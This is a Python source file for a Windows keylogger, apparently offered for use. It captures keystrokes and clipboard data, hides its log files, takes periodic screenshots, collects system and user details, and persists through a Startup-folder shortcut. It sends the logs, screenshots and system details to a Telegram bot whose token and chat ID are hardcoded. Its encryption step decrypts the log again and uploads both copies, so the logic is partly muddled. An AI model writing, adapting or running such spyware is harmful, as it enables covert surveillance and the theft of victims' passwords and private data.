# Enhanced Features
# 1. Screenshot Capture
# 2. System Information Collection
# 3. Log File Encryption
# 4. Persistence

from tempfile import gettempdir
from os import system, getenv, path
from os.path import isfile, exists, join
import threading
from pynput import keyboard
from pyperclip import paste
from datetime import datetime
from time import sleep
import requests
import pyautogui
import platform
from cryptography.fernet import Fernet
from win32com.client import Dispatch

# Change these values
TOKEN = "7351189183:AAEvrxX6-o3nZsvvDTGr_NKTyN79nO9DqtA"  # Telegram API Token
CHAT_ID = "5818909184"  # Telegram Chat ID

# Constants
INTERVAL = 60
SCREENSHOT_INTERVAL = 40  # Interval for taking screenshots (in seconds)

# Determine the temporary directory
temp_dir = gettempdir()
FILENAME = join(temp_dir, f'{datetime.now().strftime(".%d%m%Y%H%M%S")}.log')
ENCRYPTED_FILENAME = f'{FILENAME}.enc'
DECRYPTED_FILENAME = f'{FILENAME}.decrypted'  # Path for the decrypted file

# Generate a key for encryption
key = Fernet.generate_key()
cipher_suite = Fernet(key)

# Save the encryption key to a file (for decryption later)
with open("encryption_key.key", "wb") as key_file:
    key_file.write(key)

# To notify attacker if any issues occur
def alarm(msg) -> None:
    requests.get(f'https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={CHAT_ID}&text={msg}')

# Collect system information
def collect_system_info() -> str:
    system_info = f"""
    System Information:
    OS: {platform.system()} {platform.release()}
    Version: {platform.version()}
    Machine: {platform.machine()}
    Processor: {platform.processor()}
    Username: {getenv('USERNAME')}
    """
    return system_info

# Keystroke record
class Keylogger:

    def __init__(self) -> None:
        self.duplicate = ['']
        self.filename = join(gettempdir(), f'{datetime.now().strftime(".%d%m%Y%H%M%S")}.log')
        print(f"Log file path: {self.filename}")  # Debug: Print log file path

        # Ensure the log file is created
        try:
            with open(self.filename, 'w') as f:
                f.write("Initializing log file...\n")
            print(f"Log file created: {self.filename}")
        except Exception as e:
            print(f"Error creating log file: {e}")

    def savefile(self, data: str) -> None:
        try:
            file_exists = isfile(self.filename)

            with open(self.filename, 'a+') as fh:
                fh.write(data)

            if not file_exists:  # Hide the file on Windows
                system(f'attrib +h {self.filename}')
        except Exception as e:
            alarm(f'Error: {e}')

    def keylogging(self) -> None:
        def on_key_press(key) -> None:
            try:
                # Get the clipboard data
                data = paste()

                if data and data != self.duplicate[0]:
                    self.duplicate[0] = data
                    self.savefile(f'clipboard data: {data}\n')

                # Log the Keystrokes
                self.savefile(f'{key}\n')
                print(f"Key pressed: {key}")  # Debug: Print the key pressed

            except Exception as e:
                print(f"Key press error: {e}")  # Debug: Print key press errors

        def on_key_release(key):
            # Stop the listener if a specific key is pressed (e.g., Esc)
            if key == keyboard.Key.esc:
                print("Exiting keylogger...")  # Debug: Print exit message
                return False

        try:
            print("Starting keyboard listener...")  # Debug: Print listener start
            with keyboard.Listener(on_press=on_key_press, on_release=on_key_release) as listener:
                listener.join()
        except Exception as e:
            print(f"Listener error: {e}")  # Debug: Print listener errors

    def __del__(self) -> None:
        pass

# Send the file to Telegram at regular intervals
class Uploader:

    def __init__(self) -> None:
        self.encrypted_filename = f'{FILENAME}.enc'  # Use the correct encrypted file name

    def encrypt_file(self, filename: str) -> None:
        try:
            if not exists(filename):
                print(f"Error: File {filename} does not exist.")  # Debug: Print error if file is missing
                return

            print(f"Encrypting file: {filename}")  # Debug: Print the file being encrypted
            with open(filename, 'rb') as f:
                data = f.read()
            encrypted_data = cipher_suite.encrypt(data)
            with open(self.encrypted_filename, 'wb') as f:
                f.write(encrypted_data)
            print(f"File encrypted: {self.encrypted_filename}")  # Debug: Print success message
        except Exception as e:
            alarm(f'Encryption Error: {e}')

    def decrypt_file(self, encrypted_file_path: str, decrypted_file_path: str) -> None:
        try:
            # Initialize Fernet with the key
            cipher_suite = Fernet(key)

            # Read and decrypt the file
            with open(encrypted_file_path, "rb") as f:
                encrypted_data = f.read()
            decrypted_data = cipher_suite.decrypt(encrypted_data)

            # Save the decrypted data to a file
            with open(decrypted_file_path, "wb") as f:
                f.write(decrypted_data)
            print(f"File decrypted: {decrypted_file_path}")  # Debug: Print success message

            # Read and print the decrypted file content
            with open(decrypted_file_path, 'r') as f:
                decrypted_content = f.read()
            print("Decrypted file content:")
            print(decrypted_content)

        except FileNotFoundError:
            print(f"Error: File not found. Check the path for the encrypted file.")
        except Exception as e:
            print(f"Error decrypting file: {e}")

    def upload_file_to_telegram(self, file_path: str) -> None:
        try:
            with open(file_path, "rb") as fh:
                files = {"document": fh}
                resp = requests.post(
                    f"https://api.telegram.org/bot{TOKEN}/sendDocument?chat_id={CHAT_ID}",
                    files=files,
                )

                if resp.status_code != 200:
                    alarm(f"Error uploading file: {resp.status_code}")
                else:
                    print(f"File uploaded successfully: {file_path}")
        except Exception as e:
            alarm(f"Error uploading file: {e}")

    def upload_system_info(self) -> None:
        try:
            # Collect system information
            system_info = collect_system_info()

            # Save system information to a temporary file
            system_info_file = join(gettempdir(), "system_info.txt")
            with open(system_info_file, "w") as f:
                f.write(system_info)

            # Upload the system information file to Telegram
            self.upload_file_to_telegram(system_info_file)
        except Exception as e:
            alarm(f"Error uploading system info: {e}")

    def upload_file_periodically(self) -> None:
        sleep(INTERVAL)

        while True:
            try:
                if exists(FILENAME):
                    print("Log file found. Starting encryption...")  # Debug: Print log file found
                    self.encrypt_file(FILENAME)
                    if exists(self.encrypted_filename):  # Check if the encrypted file exists
                        print("Encrypted file found. Starting decryption...")  # Debug: Print encrypted file found
                        # Decrypt the file after encryption
                        self.decrypt_file(self.encrypted_filename, DECRYPTED_FILENAME)

                        # Upload the decrypted file to Telegram
                        self.upload_file_to_telegram(DECRYPTED_FILENAME)

                        # Upload the encrypted file to Telegram
                        self.upload_file_to_telegram(self.encrypted_filename)

                        # Upload system information to Telegram
                        self.upload_system_info()
                    else:
                        alarm(f'Encrypted file not found: {self.encrypted_filename}')
                else:
                    alarm(f'Log file not found: {FILENAME}')

                sleep(INTERVAL)

            except Exception as e:
                alarm(f'Error Occurred: {e}')

    def __del__(self) -> None:
        pass

# Take screenshots periodically
class ScreenshotCapture:
    def __init__(self) -> None:
        pass

    def take_screenshot(self) -> None:
        try:
            # Take a screenshot and save it to a file
            screenshot_filename = "screenshot.png"
            pyautogui.screenshot(screenshot_filename)

            # Send the screenshot to Telegram
            with open(screenshot_filename, "rb") as fh:
                files = {"document": fh}
                resp = requests.post(f"https://api.telegram.org/bot{TOKEN}/sendDocument?chat_id={CHAT_ID}", files=files)

                if resp.status_code != 200:
                    alarm(f"Screenshot Error Code: {resp.status_code}")

        except Exception as e:
            alarm(f"Screenshot Error: {e}")

    def capture_periodically(self) -> None:
        while True:
            self.take_screenshot()
            sleep(SCREENSHOT_INTERVAL)

    def __del__(self) -> None:
        pass

# Persistence: Add to startup on Windows
def add_to_startup() -> None:
    try:
        startup_folder = path.join(getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        script_path = path.abspath(__file__)
        shortcut_path = path.join(startup_folder, 'keylogger.lnk')
        if not exists(shortcut_path):
            shell = Dispatch('WScript.Shell')
            shortcut = shell.CreateShortCut(shortcut_path)
            shortcut.Targetpath = script_path
            shortcut.WorkingDirectory = path.dirname(script_path)
            shortcut.save()
    except Exception as e:
        alarm(f'Persistence Error: {e}')

if __name__ == '__main__':
    try:
        # Add to startup
        add_to_startup()

        # Collect system information
        system_info = collect_system_info()
        with open(FILENAME, 'a+') as fh:
            fh.write(system_info)

        # Create objects
        keylogger = Keylogger()
        uploader = Uploader()
        screenshot_capture = ScreenshotCapture()

        # Implement threading
        keylogger_thread = threading.Thread(target=keylogger.keylogging, daemon=True)
        uploader_thread = threading.Thread(target=uploader.upload_file_periodically, daemon=True)
        screenshot_thread = threading.Thread(target=screenshot_capture.capture_periodically, daemon=True)

        # Start threads
        keylogger_thread.start()
        uploader_thread.start()
        screenshot_thread.start()

        # Keep the main thread alive
        try:
            while True:
                sleep(1)
        except KeyboardInterrupt:
            print("Exiting script...")  # Debug: Print exit message

    except Exception as e:
        alarm(f'Main Error: {e}')